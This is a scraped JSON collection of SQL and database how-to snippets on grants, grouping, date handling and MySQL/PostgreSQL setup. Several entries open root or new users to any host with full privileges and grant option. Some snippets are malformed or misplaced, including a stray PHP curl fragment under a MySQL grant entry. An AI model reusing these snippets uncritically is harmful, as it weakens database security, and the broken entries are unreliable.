    "description": "DECLARE @UserMaster TABLE(       UserID INT NOT NULL,       UserName varchar(30) NOT NULL   );   INSERT INTO @UserMaster VALUES (1,'Rakesh')  INSERT INTO @UserMaster VALUES (2,'Ashish')  INSERT INTO @UserMaster VALUES (3,'Sagar')  SELECT * FROM @UserMaster  DECLARE @CSV VARCHAR(MAX)   SELECT @CSV = COALESCE(@CSV + ', ', '') + UserName from @UserMaster   SELECT @CSV AS Result\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1135,
    "keyword": null,
    "link": null,
    "title": " get value from a table an insert it with other values in another table sql",
    "description": "INSERT INTO table1 ( column1, column2, someInt, someVarChar ) SELECT  table2.column1, table2.column2, 8, 'some string etc.' FROM    table2 WHERE   table2.ID = 7; \nINSERT INTO column_1 ( val_1, val_from_other_table )  VALUES('val_1', (SELECT  val_2 FROM table_2 WHERE val_2 = something)) \nCREATE TABLE new_table AS SELECT *  FROM   old_table; \n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1136,
    "keyword": null,
    "link": null,
    "title": " get week day from date in sql",
    "description": "SELECT TO_CHAR(your_table.date_colunm, 'DAY') FROM your_table;\nSELECT WEEKDAY(date);\n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1137,
    "keyword": null,
    "link": null,
    "title": " get year from date postgres",
    "description": "SELECT EXTRACT(YEAR FROM column_date);\nselect extract(year from your_column) from your_table;\n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1138,
    "keyword": null,
    "link": null,
    "title": " get yesterday date ISO in psql",
    "description": "SELECT cast(to_char ((now()::date -1)::timestamp at time zone 'UTC', 'YYYY-MM-DD\"T\"HH24:MI:SS\"Z\"') as varchar)\n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1139,
    "keyword": null,
    "link": null,
    "title": " getting customers with no orders sql",
    "description": "SELECT DISTINCT I.*, ITO,itemID AS [NULL if never ordered] FROM Items As I LEFT JOIN ItemsInOrder AS ITO ON I.itemID=ITO.itemID WHERE ITO,itemID IS NULL\nSELECT * FROM Items WHERE itemID NOT IN (SELECT itemID FROM ItemsInOrder) \n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1140,
    "keyword": null,
    "link": null,
    "title": " getting next sequence value jpa postgress",
    "description": "@Query(value = \"SELECT nextval('item_id_seq')\", nativeQuery =             true)     Long getNextSeriesId(); \n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1141,
    "keyword": null,
    "link": null,
    "title": " give a column name to values generated from case statement in sql",
    "description": "SELECT *, CASE WHEN a = 'test' THEN 'yes' END as value FROM (    SELECT col1 as a FROM table ) \n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1142,
    "keyword": null,
    "link": null,
    "title": " go install mysql",
    "description": "$ go get -u github.com/go-sql-driver/mysql\n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1143,
    "keyword": null,
    "link": null,
    "title": " gorm pagination",
    "description": "func Paginate(r *http.Request) func(db *gorm.DB) *gorm.DB {  \treturn func (db *gorm.DB) *gorm.DB {         page, _ := strconv.Atoi(r.Query(\"page\"))         if page == 0 {           \tpage = 1         }         pageSize, _ := strconv.Atoi(r.Query(\"page_size\"))         switch {         \tcase pageSize > 100:               \tpageSize = 100             case pageSize <= 0:               \tpageSize = 10          }          offset := (page - 1) * pageSize          return db.Offset(offset).Limit(pageSize)   \t } }  db.Scopes(Paginate(r)).Find(&users)db.Scopes(Paginate(r)).Find(&articles)\n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1144,
    "keyword": null,
    "link": null,
    "title": " grab all records from one table to another oracle sql",
    "description": "--tbl_temp1 is the source --tbl_temp2 is the destination --fld_id is the columns you want to bring over --where statement is up to you!  INSERT INTO tbl_temp2 (fld_id) SELECT tbl_temp1.fld_order_id FROM tbl_temp1 WHERE tbl_temp1.fld_order_id > 100; \n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1145,
    "keyword": null,
    "link": null,
    "title": " grant all priviledges to mysql user",
    "description": "GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';\n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON mydb.* TO 'myuser'@'%' WITH GRANT OPTION;  /* I hope it will help you. Namaste */\n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1146,
    "keyword": null,
    "link": null,
    "title": " grant all privileges database postgres to user",
    "description": "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA schema_name TO username; \nGRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA schema_name TO username; \n",
    "reg_date": "2021-10-12T09:55:30.000Z"
  },
  {
    "id": 1147,
    "keyword": null,
    "link": null,
    "title": " grant all privileges mysql",
    "description": "GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';\nGRANT ALL PRIVILEGES ON `db_name`.* TO 'user'@'host'\n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost'; \n-- Grants / privileges list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON mydb.* TO 'myuser'@'%' WITH GRANT OPTION;  /* I hope it will help you. Namaste */\nGRANT ALL ON *.* TO 'user'@'localhost';  GRANT GRANT OPTION ON *.* TO 'user'@'localhost';\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1148,
    "keyword": null,
    "link": null,
    "title": " grant mysql",
    "description": "-- Grants list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost'; \n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON mydb.* TO 'myuser'@'%' WITH GRANT OPTION;  /* I hope it will help you. Namaste */\nGRANT ALL ON *.* TO 'user'@'localhost';  GRANT GRANT OPTION ON *.* TO 'user'@'localhost';\nif(curl_exec($ch) === false) {     echo 'Curl error: ' . curl_error($ch); } else {     echo 'Operation completed without any errors';\nGRANT UPDATE ON table_name TO 'username'@'localhost';\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1149,
    "keyword": null,
    "link": null,
    "title": " grant read only privileges postgres user",
    "description": "grant connect on database \"mydatabase\" to \"user\"; GRANT USAGE ON SCHEMA public TO \"user\"; GRANT SELECT ON ALL TABLES IN SCHEMA \"public\" TO \"user\"; ALTER DEFAULT PRIVILEGES IN SCHEMA \"public\"    GRANT SELECT ON TABLES TO \"user\";\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1150,
    "keyword": null,
    "link": null,
    "title": " grant revoke privileges to mysql username",
    "description": "#in SQL execute #GRANT type_of_permission ON database_name.table_name TO 'username'@'localhost'; GRANT ALL PRIVILEGES ON * . * TO 'username'@'localhost'; #reload all the privileges FLUSH PRIVILEGES;  #Show Privileges SHOW GRANTS FOR 'username'@'localhost';  #Revoke Privileges REVOKE type_of_permission ON database_name.table_name FROM 'username'@'localhost'; \n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1151,
    "keyword": null,
    "link": null,
    "title": " grant schema permissions postgres",
    "description": "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA schema_name TO username; \n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1152,
    "keyword": null,
    "link": null,
    "title": " grant update privilege command in mysql",
    "description": "GRANT UPDATE ON table_name TO 'username'@'localhost';\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1153,
    "keyword": null,
    "link": null,
    "title": " greater than sql server",
    "description": "SELECT * FROM employees WHERE employee_id >= 3000;\nGreater than : SELECT * FROM employees WHERE employee_id >= 3000;\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1154,
    "keyword": null,
    "link": null,
    "title": " gremove folder from git",
    "description": "git rm -r --cached <folder> git commit -m \"Removed Folder\" git push origin master\ngit rm -r --cached FolderName git commit -m \"Removed folder from repository\" git push origin master \n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1155,
    "keyword": null,
    "link": null,
    "title": " group by clause in ms sql",
    "description": "/*Group by clause is used to group a selected  set of rows into a set of summary  rows by the values of one or more column or expression. It is always used in Conjunction with one or more aggregate function.*/ SELECT AGGREGATE_FUNCTION(Column_Name) FROM Table_Name /*Group by exmaple*/ SELECT city, sum(Salary) as TotalSalary FROM tblEmployee GROUP BY City\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1156,
    "keyword": null,
    "link": null,
    "title": " group by mysql and concatenate string",
    "description": "mysql> select Id,group_concat(Name SEPARATOR ',') as GroupConcatDemo from GroupConcatenateDemo    -> group by Id;\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1157,
    "keyword": null,
    "link": null,
    "title": " group by time oracle sql",
    "description": "SELECT value1, extract(YEAR FROM my_date) FROM my_table GROUP BY value1, extract(YEAR FROM my_date);\n/*     DANIEL MOMBEYNI      */ SELECT M.YYYYMMDD,        M.HH24,        M.HALF_PART,   FROM (SELECT TO_CHAR(T.TIME_FIELD,                        'yyyy/mm/dd') AS \"YYYYMMDD\",                TO_CHAR(T.TIMESTAMP, 'HH24') AS \"HH24\",                CASE                 WHEN TO_CHAR(T.TIME_FIELD, 'MI') BETWEEN 0 AND 30 THEN                  '0-30 min'                 WHEN TO_CHAR(T.TIME_FIELD, 'MI') BETWEEN 31 AND 59 THEN                  '31-59 min'                END AS \"HALF_PART\"           FROM TBL_NAME T) M  GROUP BY M.YYYYMMDD, M.HH24, M.HALF_PART  ORDER BY 1\nSelect count(1), country_of_sale, to_char(datefield, 'YYYY-MM') AS yyyymm from table  where country_of_sale IN ('USA', 'EUROPE', 'ASIA') group by country_of_sale, to_char(datefield, 'YYYY-MM') order by to_char(datefield, 'YYYY-MM');\n",
    "reg_date": "2021-10-12T09:55:31.000Z"
  },
  {
    "id": 1158,
    "keyword": null,
    "link": null,
    "title": " group concat in mysql",
    "description": "SELECT GROUP_CONCAT(DISTINCT categories ORDER BY categories ASC SEPARATOR ' ') FROM table \nmysql> select Id,group_concat(Name SEPARATOR ',') as GroupConcatDemo from GroupConcatenateDemo    -> group by Id;\nSELECT STRING_AGG(column_name, ',') AS Result FROM table_name\nGROUP_CONCAT(eng_category_name SEPARATOR ',') as eng_category_name\nSELECT emp_id, fname, lname, dept_id,  GROUP_CONCAT ( strength ) as \"strengths\"  FROM employee group by emp_id; \nGROUP_CONCAT(expr); \n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1159,
    "keyword": null,
    "link": null,
    "title": " group concat limit mysql",
    "description": "//if you can want increase the group_contat max length SET SESSION group_concat_max_len = 1000000;\nDB::statement('SET GLOBAL group_concat_max_len = 1000000');\n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1160,
    "keyword": null,
    "link": null,
    "title": " group concat max length mysql",
    "description": "//if you can want increase the group_contat max length SET SESSION group_concat_max_len = 1000000;\n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1161,
    "keyword": null,
    "link": null,
    "title": " group concat mysql",
    "description": "SELECT GROUP_CONCAT(DISTINCT categories ORDER BY categories ASC SEPARATOR ' ') FROM table \nmysql> select Id,group_concat(Name SEPARATOR ',') as GroupConcatDemo from GroupConcatenateDemo    -> group by Id;\nGROUP_CONCAT(artists.artistname SEPARATOR '----') \nGROUP_CONCAT(eng_category_name SEPARATOR ',') as eng_category_name\nSELECT emp_id, fname, lname, dept_id,  GROUP_CONCAT ( strength ) as \"strengths\"  FROM employee group by emp_id; \nGROUP_CONCAT(expr); \n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1162,
    "keyword": null,
    "link": null,
    "title": " group function in sql",
    "description": "GROUP BY: is used to collaborate with the SELECT statement to arrange  matching data into groups.  ORDER BY: is for sorting result either in descending or ascending order.\n--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG\n SELECT column_name(s)   FROM table_name   WHERE condition   GROUP BY column_name(s)   HAVING condition   ORDER BY column_name(s); \n/*Group by clause is used to group a selected  set of rows into a set of summary  rows by the values of one or more column or expression. It is always used in Conjunction with one or more aggregate function.*/ SELECT AGGREGATE_FUNCTION(Column_Name) FROM Table_Name /*Group by exmaple*/ SELECT city, sum(Salary) as TotalSalary FROM tblEmployee GROUP BY City\n-- It accepts a single column as a parameter and returns \"1\"  -- if the column contains a null value generated  as part of a -- subtotal by a ROLLUP or CUBE operation or \"0\" for any other value, -- including stored null values  SELECT fact_1_id,        fact_2_id,        SUM(sales_value) AS sales_value,        GROUPING(fact_1_id) AS f1g,         GROUPING(fact_2_id) AS f2g FROM   dimension_tab GROUP BY CUBE (fact_1_id, fact_2_id) HAVING GROUPING(fact_1_id) = 1 OR GROUPING(fact_2_id) = 1 ORDER BY GROUPING(fact_1_id), GROUPING(fact_2_id);\nSELECT <field1, field2, field3&hellip;> FROM <table1_name> WHERE <condition/expression> GROUP BY <field1, field2, field3&hellip;>\n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1163,
    "keyword": null,
    "link": null,
    "title": " groupby error in mysql",
    "description": "mysql> set global sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'; mysql> set session sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';\n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1164,
    "keyword": null,
    "link": null,
    "title": " guid to string sql",
    "description": "convert(nvarchar(50), {GuidColumnHere!})\n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1165,
    "keyword": null,
    "link": null,
    "title": " h2 auto increment and unique",
    "description": "drop table test; create table test(id bigint auto_increment, name varchar(255)); insert into test(name) values('hello'); insert into test(name) values('world'); select * from test;  \n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1166,
    "keyword": null,
    "link": null,
    "title": " having clause",
    "description": "Having keyword basically similar to if condition Only returns true conditions  SELECT FIRST_NAME , COUNT(*) FROM EMPLOYEES  GROUP BY FIRST_NAME HAVING COUNT(*) > 1\nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500; \nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500;\n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1167,
    "keyword": null,
    "link": null,
    "title": " having clause in sql",
    "description": "Having keyword basically similar to if condition Only returns true conditions  SELECT FIRST_NAME , COUNT(*) FROM EMPLOYEES  GROUP BY FIRST_NAME HAVING COUNT(*) > 1\nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500; \nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500;\n",
    "reg_date": "2021-10-12T09:55:32.000Z"
  },
  {
    "id": 1168,
    "keyword": null,
    "link": null,
    "title": " having clause vs where clause sql",
    "description": "The difference between the having and where clause in SQL is that the where clause cannot be used with aggregates(max, min,count,avg,sum) , but the having clause can.\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1169,
    "keyword": null,
    "link": null,
    "title": " having in mysql",
    "description": "SELECT      ordernumber,     SUM(quantityOrdered) AS itemsCount,     SUM(priceeach*quantityOrdered) AS total FROM     orderdetails GROUP BY     ordernumber HAVING     total > 1000;\nSELECT colonne1, SUM(colonne2) FROM nom_table GROUP BY colonne1 HAVING fonction(colonne2) operateur valeur\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1170,
    "keyword": null,
    "link": null,
    "title": " having in sql",
    "description": "Having keyword basically similar to if condition Only returns true conditions  SELECT FIRST_NAME , COUNT(*) FROM EMPLOYEES  GROUP BY FIRST_NAME HAVING COUNT(*) > 1\nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500; \nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500;\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1171,
    "keyword": null,
    "link": null,
    "title": " having keyword sql",
    "description": "Having keyword basically similar to if condition Only returns true conditions  SELECT FIRST_NAME , COUNT(*) FROM EMPLOYEES  GROUP BY FIRST_NAME HAVING COUNT(*) > 1\nHAVING clause in SQL is used to filter records in combination with the GROUP BY clause. It is different from WHERE, since  WHERE clause cannot filter  aggregated records. HAVING is a column operation.  Select department_id, Min (Salary) From Employees Group By Department_id Having MIN (salary) < 3500; \n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1172,
    "keyword": null,
    "link": null,
    "title": " having vs where",
    "description": "The difference between the having and where clause in SQL is that the where clause cannot be used with aggregates(max, min,count,avg,sum) , but the having clause can.\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1173,
    "keyword": null,
    "link": null,
    "title": " having vs where sql",
    "description": "The difference between the having and where clause in SQL is that the where clause cannot be used with aggregates(max, min,count,avg,sum) , but the having clause can.\nThe difference between the having and where clause in SQL is that the where  clause cannot be used with aggregates, but the having clause can.\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1174,
    "keyword": null,
    "link": null,
    "title": " hexadec to sql REDSHIFT",
    "description": "strtol('5f22b9ad', 16)\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1175,
    "keyword": null,
    "link": null,
    "title": " hibernate.cfg.xml mysql 8",
    "description": "<property name=\"connection.driver_class\">com.mysql.cj.jdbc.Driver</property>\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1176,
    "keyword": null,
    "link": null,
    "title": " hibernate dialect property xml for mysql 8",
    "description": "<property name=\"dialect\">org.hibernate.dialect.MySQL8Dialect</property>\n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1177,
    "keyword": null,
    "link": null,
    "title": " hibernate with springboot mysql",
    "description": "spring.datasource.url= jdbc:mysql://localhost:3306/testdb?useSSL=false spring.datasource.username= root spring.datasource.password= 123456  spring.jpa.properties.hibernate.dialect= org.hibernate.dialect.MySQL5InnoDBDialect  # Hibernate ddl auto (create, create-drop, validate, update) spring.jpa.hibernate.ddl-auto= update \n",
    "reg_date": "2021-10-12T09:55:33.000Z"
  },
  {
    "id": 1178,
    "keyword": null,
    "link": null,
    "title": " homebrew install mysql",
    "description": "brew install mysql@5.7  # 添加mysql到环境变量 echo 'export PATH=\"/opt/homebrew/opt/mysql@5.7/bin:$PATH\"' >> ~/.zshrc  # 刷新 source ~/.zshrc  # 查看当前版本 mysql --version  # 没有提示你默认密码是多少 通过下面的命令直接修改密码 mysqladmin -u root password \"你的密码\"  # 然后重启mysql服务 mysql.server restart 12345678910111213141516\nRUN THIS COMMAND : mysql_secure_installation\n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1179,
    "keyword": null,
    "link": null,
    "title": " host 127.0 0.1 is not allowed to connect to this mysql server",
    "description": "UPDATE mysql.user SET host='%' WHERE user='root';\n    mysql -u root -p     -- root password      CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;      CREATE USER 'username'@'%' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;      FLUSH PRIVILEGES;      EXIT;\n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1180,
    "keyword": null,
    "link": null,
    "title": " host is not allowed to connect to this mysql server",
    "description": "CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;  CREATE USER 'username'@'%' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;  FLUSH PRIVILEGES;\n    mysql -u root -p     -- root password      CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;      CREATE USER 'username'@'%' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;      FLUSH PRIVILEGES;      EXIT;\nGRANT ALL PRIVILEGES ON *.* TO root@my_ip IDENTIFIED BY &lsquo;root_password&lsquo; WITH GRANT OPTION;\n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1181,
    "keyword": null,
    "link": null,
    "title": " host not allowed to connect to this mysql server",
    "description": "CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;  CREATE USER 'username'@'%' IDENTIFIED BY 'password';  GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;  FLUSH PRIVILEGES;\n    mysql -u root -p     -- root password      CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' WITH GRANT OPTION;      CREATE USER 'username'@'%' IDENTIFIED BY 'password';      GRANT ALL PRIVILEGES ON *.* TO 'username'@'%' WITH GRANT OPTION;      FLUSH PRIVILEGES;      EXIT;\nGRANT ALL PRIVILEGES ON *.* TO root@my_ip IDENTIFIED BY &lsquo;root_password&lsquo; WITH GRANT OPTION;\n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1182,
    "keyword": null,
    "link": null,
    "title": " how-can-i-start-postgresql-server-on-mac-os-x",
    "description": "If you want to manually start and stop PostgreSQL (installed via Homebrew), the easiest way is:  brew services start postgresql  and  brew services stop postgresql  If you have a specific version, make sure to suffix the version. For example:  brew services start postgresql@10\n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1183,
    "keyword": null,
    "link": null,
    "title": " how asp.net core works with sql server",
    "description": "public void ConfigureServices(IServiceCollection services) {     services.AddRazorPages();      services.AddDbContext<RazorPagesMovieContext>(options =>       options.UseSqlServer(Configuration.GetConnectionString(\"RazorPagesMovieContext\"))); } \n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1184,
    "keyword": null,
    "link": null,
    "title": " how delete foreign key in mysql",
    "description": "ALTER TABLE jobs DROP FOREIGN KEY constraint_name \nSET foreign_key_checks = 0;\n ALTER TABLE Orders  DROP FOREIGN KEY FK_PersonOrder; \n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1185,
    "keyword": null,
    "link": null,
    "title": " how do i wrire data to sqlite db via tkinter ui",
    "description": "l0 = tk.Label(my_w,  text='Add Student',               font=('Helvetica', 16), width=30,anchor=\"c\" )   l0.grid(row=1,column=1,columnspan=4)   l1 = tk.Label(my_w,  text='Name: ', width=10,anchor=\"c\" )   l1.grid(row=3,column=1)   # add one text box t1 = tk.Text(my_w,  height=1, width=10,bg='white')  t1.grid(row=3,column=2)   l2 = tk.Label(my_w,  text='Class: ', width=10 )   l2.grid(row=4,column=1)   # add list box for selection of class options = StringVar(my_w) options.set(\"\") # default value  opt1 = OptionMenu(my_w, options, \"Three\", \"Four\", \"Five\") opt1.grid(row=4,column=2)  l3 = tk.Label(my_w,  text='Mark: ', width=10 )   l3.grid(row=5,column=1)   # add one text box t3 = tk.Text(my_w,  height=1, width=4,bg='white')  t3.grid(row=5,column=2)   radio_v = tk.StringVar() radio_v.set('Female') r1 = tk.Radiobutton(my_w, text='Male', variable=radio_v, value='Male') r1.grid(row=6,column=2)  r2 = tk.Radiobutton(my_w, text='Female', variable=radio_v, value='Female') r2.grid(row=6,column=3)  b1 = tk.Button(my_w,  text='Add Record', width=10,                 command=lambda: add_data())   b1.grid(row=7,column=2)  my_str = tk.StringVar() l5 = tk.Label(my_w,  textvariable=my_str, width=10 )   l5.grid(row=3,column=3)  my_str.set(\"Output\")\n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1186,
    "keyword": null,
    "link": null,
    "title": " how do you comment in mysql workbench",
    "description": "mysql> SELECT 1+1;     # This comment continues to the end of line mysql> SELECT 1+1;     -- This comment continues to the end of line mysql> SELECT 1 /* this is an in-line comment */ + 1; mysql> SELECT 1+ /* this is a multiple-line comment */ 1;\n#this is a comment -- this is a comment but requires a whitespace/tab/newline after the double -\n",
    "reg_date": "2021-10-12T09:55:34.000Z"
  },
  {
    "id": 1187,
    "keyword": null,
    "link": null,
    "title": " how do you connect the database",
    "description": "I USE JDCB I use CONNECTION database to make connection I create STATEMENT than I use statement to create query  And run the query and get the RESULT SET   Connection = import java.sql.Connection; Driver manager = import java.sql.DriverManager; Connection connection = DriverManager.getConnection(url, userName, passWord);  Connection String Syntax: jdbc:DataBaseType\"subprotocal:Host:port:SID  After succesfully created the connect next step is STATEMENT  import java.sql.Statement; Statement statement = connection.createStatement();  -We use createStatement() method to create the statement from our connection. -The result we get from this type of statement can only move from top to bottom, not other way around  Once we have statement we can run the query and get the result to ResultSet format  \t\timport java.sql.ResultSet;          We use the method executeQuery() to execute our queries  ResultSet result = statement.executeQuery(\"Select * from employees\");\n<?php $servername = \"localhost\"; $username = \"yourusername\"; // For MYSQL the predifined username is root $password = \"yourpassword\"; // For MYSQL the predifined password is \" \"(blank)  // Create connection $conn = new mysqli($servername, $username, $password);    // Check connection   if ($conn->connect_error) {      die(\"Connection failed: \" . $conn->connect_error); }  echo \"Connected successfully\";  ?>\n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1188,
    "keyword": null,
    "link": null,
    "title": " how do you use sql in you company",
    "description": "Our web application uses Oracle database and  I normally write queries to do Data validation.  For example:  I create data from UI or I send POST request from API then I write query to verify that data was successfully and correctly inserted into database. Our database consists of many tables, so most of the time, I need to write queries that involve joins.  CAN MENTION: Since our application has large sets of data, data is stored into Oracle and to another CACHE database. I write queries to test data that both are in SYNC(same).\n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1189,
    "keyword": null,
    "link": null,
    "title": " how much every mysql database record takes from diskspace",
    "description": "SELECT table_schema as 'Database Name',          sum( data_length + index_length ) as 'Size-Bytes',                round((sum(data_length + index_length) / 1024 / 1024), 4) as 'Size-MB'  FROM     information_schema.TABLES  GROUP BY table_schema\n",
    "reg_date": "2021-10-12T09:55:35.000Z"
  },
  {
    "id": 1190,
    "keyword": null,
    "link": null,
    "title": " how not to sort by average rating",
    "description": "SELECT widget_id, ((positive + 1.9208) / (positive + negative) -                     1.96 * SQRT((positive * negative) / (positive + negative) + 0.9604) /                            (positive + negative)) / (1 + 3.8416 / (positive + negative))         AS ci_lower_bound FROM widgets WHERE positive + negative > 0         ORDER BY ci_lower_bound DESC; \n",
